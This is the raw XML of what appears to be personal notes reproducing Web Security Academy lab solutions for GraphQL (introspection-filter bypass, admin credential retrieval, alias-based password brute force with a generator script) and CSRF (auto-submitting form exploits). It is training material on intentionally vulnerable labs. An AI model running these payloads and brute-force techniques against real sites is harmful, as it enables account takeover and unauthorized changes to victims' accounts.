          <text:p text:style-name="P47">In Burp's browser, access the lab and select <text:span text:style-name="Strong_20_Emphasis">My account</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">Attempt to log in to the site. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">In Burp, go to <text:span text:style-name="Strong_20_Emphasis">Proxy &gt; HTTP history</text:span> and notice that the login attempt is sent as a GraphQL mutation containing a username and password. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">Right-click the login request and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">In Repeater, right-click anywhere within the Request panel of the message editor and select <text:span text:style-name="Strong_20_Emphasis">GraphQL &gt; Set introspection query</text:span> to insert an introspection query into the request body. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">Send the request. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">Right-click the message and select <text:span text:style-name="Strong_20_Emphasis">GraphQL &gt; Save GraphQL queries to site map</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">Go to <text:span text:style-name="Strong_20_Emphasis">Target &gt; Site map</text:span> and review the GraphQL queries. Notice the following: </text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P48">There is a <text:span text:style-name="Source_20_Text">getUser</text:span> query that returns a user's username and password. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P47">This query fetches the relevant user information via a direct reference to an <text:span text:style-name="Source_20_Text">id</text:span> number. </text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Modify the query to retrieve the administrator credentials</text:span> </text:p>
      <text:list text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P49">Right-click the the <text:span text:style-name="Source_20_Text">getUser</text:span> query and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">In Repeater, click <text:span text:style-name="Strong_20_Emphasis">Send</text:span>. Notice that the default <text:span text:style-name="Source_20_Text">id</text:span> value of <text:span text:style-name="Source_20_Text">0</text:span> doesn't return a user. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">Select the GraphQL tab and test alternative values for the <text:span text:style-name="Source_20_Text">id</text:span> variable until the API returns the administrator's credentials. In this case, the administrator's ID is <text:span text:style-name="Source_20_Text">1</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">Log in to the site as the administrator, go to the <text:span text:style-name="Strong_20_Emphasis">Admin</text:span> panel, and delete <text:span text:style-name="Source_20_Text">carlos</text:span> to solve the lab. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P22"><text:span text:style-name="T10">c. </text:span>Lab: Finding a hidden GraphQL endpoint</text:p>
      <text:p text:style-name="P18">Solved </text:p>
      <text:p text:style-name="Text_20_body">The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses <text:soft-page-break/>against introspection. </text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, find the hidden endpoint and delete <text:span text:style-name="Source_20_Text">carlos</text:span>. </text:p>
      <text:p text:style-name="Text_20_body">Learn more about Working with GraphQL in Burp Suite. </text:p>
      <text:h text:style-name="P17" text:outline-level="4">Solution</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Find the hidden GraphQL endpoint</text:span> </text:p>
      <text:list text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P50">In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50">Note that when you send a GET request to <text:span text:style-name="Source_20_Text">/api</text:span> the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50">Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter. </text:p>
          <text:p text:style-name="P50">For example: <text:span text:style-name="Source_20_Text">/api?query=query{__typename}</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50">Notice that the response confirms that this is a GraphQL endpoint: </text:p>
          <text:p text:style-name="P50"><text:span text:style-name="Source_20_Text">{ "data": { "__typename": "query" } } </text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Overcome the introspection defenses</text:span> </text:p>
      <text:list text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P51">Send a new request with a URL-encoded introspection query as a query parameter. </text:p>
          <text:p text:style-name="P51">To do this, right-click the request and select <text:span text:style-name="Strong_20_Emphasis">GraphQL &gt; Set introspection query</text:span>: </text:p>
          <text:p text:style-name="P52"><text:span text:style-name="Source_20_Text">/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++</text:span><text:soft-page-break/><text:span text:style-name="Source_20_Text">%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51">Notice from the response that introspection is disallowed. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51">Modify the query to include a newline character after <text:span text:style-name="Source_20_Text">__schema</text:span> and resend. </text:p>
          <text:p text:style-name="P51">For example: </text:p>
          <text:p text:style-name="P52"><text:span text:style-name="Source_20_Text">/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P51">Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex <text:span text:style-name="Source_20_Text">"__schema{"</text:span>, which the query no longer matches even though it is still a valid introspection query. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis">Exploit the vulnerability to delete carlos</text:span> </text:p>
      <text:list text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P53">Right-click the request and select <text:span text:style-name="Strong_20_Emphasis">GraphQL &gt; Save GraphQL queries to site map</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P53">Go to <text:span text:style-name="Strong_20_Emphasis">Target &gt; Site map</text:span> to see the API queries. Use the <text:span text:style-name="Strong_20_Emphasis">GraphQL</text:span> tab and find the <text:span text:style-name="Source_20_Text">getUser</text:span> query. Right-click the request and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P53">In Repeater, send the <text:span text:style-name="Source_20_Text">getUser</text:span> query to the endpoint you discovered. </text:p>
          <text:p text:style-name="P53">Notice that the response returns: </text:p>
          <text:p text:style-name="P54"><text:span text:style-name="Source_20_Text">{ "data": { "getUser": null } }</text:span> </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P53">Click on the GraphQL tab and change the <text:span text:style-name="Source_20_Text">id</text:span> variable to find <text:span text:style-name="Source_20_Text">carlos</text:span>'s user ID. In this case, the relevant user ID is <text:span text:style-name="Source_20_Text">3</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P53">In <text:span text:style-name="Strong_20_Emphasis">Target &gt; Site map</text:span>, browse the schema again and find the <text:span text:style-name="Source_20_Text">deleteOrganizationUser</text:span> mutation. Notice that this mutation takes a user ID as a parameter. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P53">Send the request to Repeater. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P53">In Repeater, send a <text:span text:style-name="Source_20_Text">deleteOrganizationUser</text:span> mutation with a user ID of <text:span text:style-name="Source_20_Text">3</text:span> to delete <text:span text:style-name="Source_20_Text">carlos</text:span> and solve the lab. </text:p>
          <text:p text:style-name="P53">For example: </text:p>
          <text:p text:style-name="P53"><text:span text:style-name="Source_20_Text">/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D </text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Source_20_Text"/></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">d. </text:span></text:span><text:span text:style-name="Source_20_Text">Lab: Bypassing GraphQL brute force protections</text:span></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="Source_20_Text">The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time. </text:span></text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, brute force the login mechanism to sign in as <text:span text:style-name="Source_20_Text">carlos</text:span>. Use the list of authentication lab passwords as your password source. </text:p>
      <text:p text:style-name="Text_20_body">Learn more about Working with GraphQL in Burp Suite. </text:p>
      <text:p text:style-name="P25"><text:span text:style-name="Source_20_Text">The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time. </text:span></text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, brute force the login mechanism to sign in as <text:span text:style-name="Source_20_Text">carlos</text:span>. Use the list of authentication lab passwords as your password source. </text:p>
      <text:p text:style-name="Text_20_body">Learn more about Working with GraphQL in Burp Suite. </text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:soft-page-break/>Tip</text:h>
      <text:p text:style-name="Text_20_body">This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request. </text:p>
      <text:p text:style-name="Text_20_body">The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script: </text:p>
      <text:list text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P56">Open the lab in Burp's browser. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">Right-click the page and select <text:span text:style-name="Strong_20_Emphasis">Inspect</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">Select the <text:span text:style-name="Strong_20_Emphasis">Console</text:span> tab. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P55">Paste the script and press Enter. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">You can then use the generated aliases when crafting your request in Repeater. </text:p>
      <text:p text:style-name="P23"><text:span text:style-name="Source_20_Text">copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=&gt;` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard."); </text:span></text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">Solution</text:h>
      <text:list text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P57">In Burp's browser, access the lab and select <text:span text:style-name="Strong_20_Emphasis">My account</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Attempt to log in to the site using incorrect credentials. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">In Burp, go to <text:span text:style-name="Strong_20_Emphasis">Proxy &gt; HTTP history</text:span>. Note that login requests are sent as a GraphQL mutation. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Right-click the login request and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">In Repeater, attempt some further login requests with incorrect credentials. Note that after a short period of time the API starts to return a rate limit error. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">In the GraphQL tab, craft a request that uses aliases to send multiple login mutations in one message. See the tip in this lab for a method that makes this process less time-consuming. </text:p>
          <text:p text:style-name="P57">Bear the following in mind when constructing your request: </text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P58"><text:soft-page-break/>The list of aliases should be contained within a <text:span text:style-name="Source_20_Text">mutation {}</text:span> type. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P58">Each aliased mutation should have the username <text:span text:style-name="Source_20_Text">carlos</text:span> and a different password from the authentication list. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P58">If you are modifying the request that you sent to Repeater, delete the variable dictionary and <text:span text:style-name="Source_20_Text">operationName</text:span> field from the request before sending. You can do this from Repeater's <text:span text:style-name="Strong_20_Emphasis">Pretty</text:span> tab. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P58">Ensure that each alias requests the <text:span text:style-name="Source_20_Text">success</text:span> field, as shown in the simplified example below: </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="P58"><text:span text:style-name="Source_20_Text">mutation { bruteforce0:login(input:{password: "123456", username: "carlos"}) { token success } bruteforce1:login(input:{password: "password", username: "carlos"}) { token success } ... bruteforce99:login(input:{password: "12345678", username: "carlos"}) { token success } } </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Click <text:span text:style-name="Strong_20_Emphasis">Send</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Notice that the response lists each login attempt and whether its login attempt was successful. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Use the search bar below the response to search for the string <text:span text:style-name="Source_20_Text">true</text:span>. This indicates which of the aliased mutations was able to successfully log in as <text:span text:style-name="Source_20_Text">carlos</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Check the request for the password that was used by the successful alias. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P57">Log in to the site using the <text:span text:style-name="Source_20_Text">carlos</text:span> credentials to solve the lab. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:s/></text:p>
      <text:p text:style-name="P28"><text:span text:style-name="T13">e. </text:span>Lab: Performing CSRF exploits over GraphQL</text:p>
      <text:p text:style-name="P27">The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of <text:span text:style-name="Source_20_Text">x-www-form-urlencoded</text:span> and is therefore vulnerable to cross-site request forgery (CSRF) attacks. </text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server. </text:p>
      <text:p text:style-name="Text_20_body">You can log in to your own account using the following credentials: <text:span text:style-name="Source_20_Text">wiener:peter</text:span>. </text:p>
      <text:p text:style-name="Text_20_body">Learn more about Working with GraphQL in Burp Suite. </text:p>
      <text:p text:style-name="P27">Access the lab</text:p>
      <text:h text:style-name="P26" text:outline-level="4">Solution</text:h>
      <text:list text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P59">Open Burp's browser, access the lab and log in to your account. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Enter a new email address, then click <text:span text:style-name="Strong_20_Emphasis">Update email</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">In Burp, go to <text:span text:style-name="Strong_20_Emphasis">Proxy &gt; HTTP history</text:span> and check the resulting request. Note that the email change is sent as a GraphQL mutation. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Right-click the email change request and select <text:span text:style-name="Strong_20_Emphasis">Send to Repeater</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59"><text:soft-page-break/>In Repeater, amend the GraphQL query to change the email to a second different address. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Click <text:span text:style-name="Strong_20_Emphasis">Send</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Convert the request into a POST request with a <text:span text:style-name="Source_20_Text">Content-Type</text:span> of <text:span text:style-name="Source_20_Text">x-www-form-urlencoded</text:span>. To do this, right-click the request and select <text:span text:style-name="Strong_20_Emphasis">Change request method</text:span> twice. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Notice that the mutation request body has been deleted. Add the request body back in with URL encoding. </text:p>
          <text:p text:style-name="P59">The body should look like the below: </text:p>
          <text:p text:style-name="P59"><text:span text:style-name="Source_20_Text">query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&amp;operationName=changeEmail&amp;variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Right-click the request and select <text:span text:style-name="Strong_20_Emphasis">Engagement tools &gt; Generate CSRF PoC</text:span>. Burp displays the <text:span text:style-name="Strong_20_Emphasis">CSRF PoC generator</text:span> dialog. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Amend the HTML in the <text:span text:style-name="Strong_20_Emphasis">CSRF PoC generator</text:span> dialog so that it changes the email a third time. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Copy the HTML. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">In the lab, click <text:span text:style-name="Strong_20_Emphasis">Go to exploit server</text:span>. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P59">Paste the HTML into the exploit server and click <text:span text:style-name="Strong_20_Emphasis">Deliver exploit to victim</text:span> to solve the lab. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60">4. Cross site Request Forgery:</text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T14">a. </text:span>Lab: CSRF where token validation depends on request method</text:p>
      <text:p text:style-name="P60">This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. </text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. </text:p>
      <text:p text:style-name="Text_20_body">You can log in to your own account using the following credentials: <text:span text:style-name="Source_20_Text">wiener:peter</text:span> </text:p>
      <text:h text:style-name="P29" text:outline-level="4">Solution</text:h>
      <text:list text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P63">Open Burp's browser and log in to your account. Submit the "Update email" form, and find the <text:soft-page-break/>resulting request in your Proxy history. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63">Send the request to Burp Repeater and observe that if you change the value of the <text:span text:style-name="Source_20_Text">csrf</text:span> parameter then the request is rejected. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63">Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P62">If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate". </text:p>
          <text:p text:style-name="P62">Alternatively, if you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL". </text:p>
          <text:p text:style-name="P63"><text:span text:style-name="Source_20_Text">&lt;form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt; &lt;input type="hidden" name="email" value="anything%40web-security-academy.net"&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</text:span> </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63">Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store". </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63">To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63">Change the email address in your exploit so that it doesn't match your own. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P62">Store the exploit, then click "Deliver to victim" to solve the lab. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P65"><text:span text:style-name="T15">b. </text:span>Lab: CSRF where token validation depends on token being present</text:p>
      <text:p text:style-name="P64">This lab's email change functionality is vulnerable to CSRF. </text:p>
      <text:p text:style-name="Text_20_body">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. </text:p>
      <text:p text:style-name="P69">Access the lab</text:p>
      <text:h text:style-name="P30" text:outline-level="4">Solution</text:h>
      <text:p text:style-name="Text_20_body">You can log in to your own account using the following credentials: <text:span text:style-name="Source_20_Text">wiener:peter</text:span> </text:p>
      <text:p text:style-name="P64">Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history. </text:p>
      <text:list text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P67">Send the request to Burp Repeater and observe that if you change the value of the <text:span text:style-name="Source_20_Text">csrf</text:span> parameter then the request is rejected. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67">Delete the <text:span text:style-name="Source_20_Text">csrf</text:span> parameter entirely and observe that the request is now accepted. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66">If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate". </text:p>
          <text:p text:style-name="P66">Alternatively, if you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL". </text:p>
          <text:p text:style-name="P67"><text:soft-page-break/><text:span text:style-name="Source_20_Text">&lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt; &lt;input type="hidden" name="$param1name" value="$param1value"&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</text:span> </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67">Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store". </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67">To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67">Change the email address in your exploit so that it doesn't match your own. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66">Store the exploit, then click "Deliver to victim" to solve the lab. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P68">c.</text:p>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Courier, sans-serif"/>
    <style:font-face style:name="Courier" svg:font-family="Courier,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06T16:01:47.680946810</dc:date>
    <meta:editing-duration>PT1H26M9S</meta:editing-duration>
    <meta:editing-cycles>12</meta:editing-cycles>
    <meta:generator>LibreOffice/24.2.5.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="19" meta:paragraph-count="389" meta:word-count="5206" meta:character-count="37300" meta:non-whitespace-character-count="31859"/>
  </office:meta>
</office:document-meta>
</file>